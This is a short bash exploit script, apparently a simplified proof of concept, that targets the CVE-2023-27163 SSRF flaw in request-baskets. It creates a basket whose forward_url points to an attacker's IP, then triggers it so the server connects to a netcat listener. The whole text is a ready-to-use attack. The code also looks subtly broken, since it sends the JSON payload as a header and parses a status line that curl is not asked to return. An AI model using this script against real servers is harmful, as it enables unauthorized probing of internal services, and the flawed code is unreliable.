#CVE-2023-27163
#this is a simpler version of the PoC on the internet and easier to use
#it exploits the SSRF vulnerability on the request-baskets up to v1.2.1
#via the component /api/baskets/{name}
#while running this script make sure that you have Netcat opened with its associated port 
#example nc -lnvp 8000
#and on the attackersip remember to put your IP address plus the port number opened using Netcat
#
#
#
#tool name: Basketcraft
#Author: Kharim Mchatta
#version: 1.0.0
#
#
#
#

#!/bin/bash

# Prompt the user for their IP address
read -p "Enter your IP address (attackerip): " attackerip

# Prompt the user for the URL and basket name
read -p "Enter the target URL and port number: " url
read -p "Enter the basket name: " basketname

# Build the JSON payload
payload='{
  "forward_url": "'$attackerip'/'$basketname'",
  "proxy_response": false,
  "insecure_tls": false,
  "expand_path": true,
  "capacity": 250
}'

# Send the POST request using curl with the specified JSON payload in the headers
response=$(curl -s -X POST "$url/api/baskets/$basketname" \
  -H "Content-Type: application/json" \
  -H "$payload")

# Check the HTTP response code
http_status=$(echo "$response" | head -n 1 | cut -d' ' -f2)

if [ "$http_status" -eq 201 ]; then
    # Parse the token from the JSON response
    token=$(echo "$response" | jq -r .token)

    # Output success message with the token
    echo "Basket name created successfully! Here is your basket name token: $token"
	
	# run the payload to connect to your Netcat listener
    run_payload="$url/$basketname"
    echo "Running the payload now... make sure that your netcat is running: $run_payload"
    curl -s "$run_payload"
else
    # Output an error message if the response is not 201 Created
    echo "Error: Basket creation failed. HTTP Status Code: $http_status"
fi
